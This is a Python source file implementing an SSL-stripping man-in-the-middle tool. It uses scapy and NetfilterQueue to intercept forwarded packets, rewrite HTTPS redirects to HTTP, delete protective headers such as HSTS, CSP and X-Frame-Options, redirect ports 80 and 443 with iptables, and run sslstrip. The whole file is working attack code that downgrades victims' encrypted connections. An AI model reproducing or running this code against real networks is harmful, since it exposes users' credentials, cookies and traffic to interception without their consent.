from scapy.all import *
from netfilterqueue import NetfilterQueue
from scapy.layers.http import *
import scapy

import os
import threading
import cryptography    #required for tls

class SslRemover():

    def __init__(self, queue_num):

        self.queue         = NetfilterQueue()
        self.iprule_add    = "iptables -A FORWARD -j NFQUEUE --queue-num {}".format(queue_num)
        self.iprule_remove = "iptables -D FORWARD -j NFQUEUE --queue-num {}".format(queue_num)

        self.thread        = threading.Thread(name="ssl-remover-{}".format(queue_num), target=self.queue.run)
        self.thread.setDaemon(True)

        self.queue.bind(queue_num, self.handle_packet)
    
    def handle_packet(self, packet_nfqueue):
        """Handles each packet in the queue by parsing them and editing them."""
        packet_scapy = IP(packet_nfqueue.get_payload()) #converts the raw packet to a scapy compatible string
        
        if packet_scapy.haslayer(HTTPResponse): #read the scapy string to check for HTTP responses from the server
            if not packet_scapy[HTTPResponse].Location==None:
                packet_scapy[HTTPResponse].Location = (packet_scapy[HTTPResponse].Location).replace("https://", "http://") #edit the redirect location to a http address instead of https

            #delete cookies that might interfere
            del packet_scapy[HTTPResponse].Strict_Transport_Security
            del packet_scapy[HTTPResponse].Public_Key_Pins
            del packet_scapy[HTTPResponse].Content_Security_Policy
            del packet_scapy[HTTPResponse].X_XSS_Protection
            del packet_scapy[HTTPResponse].X_Frame_Options

            packet_nfqueue.set_payload(bytes(packet_scapy))
            
        return packet_nfqueue.accept() #accept the packet and release it back into the wild
        
      
    def start(self):

        os.system(self.iprule_add)
        
        self.thread.start()    #queue starts accepting packages

        #run sslstrip by m0xie 
        os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
        os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
        os.system("sslstrip -l 8080")

    def stop(self):

        os.system(self.iprule_remove)
        os.system("iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
        os.system("iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")

        self.queue.unbind()    #delete queue
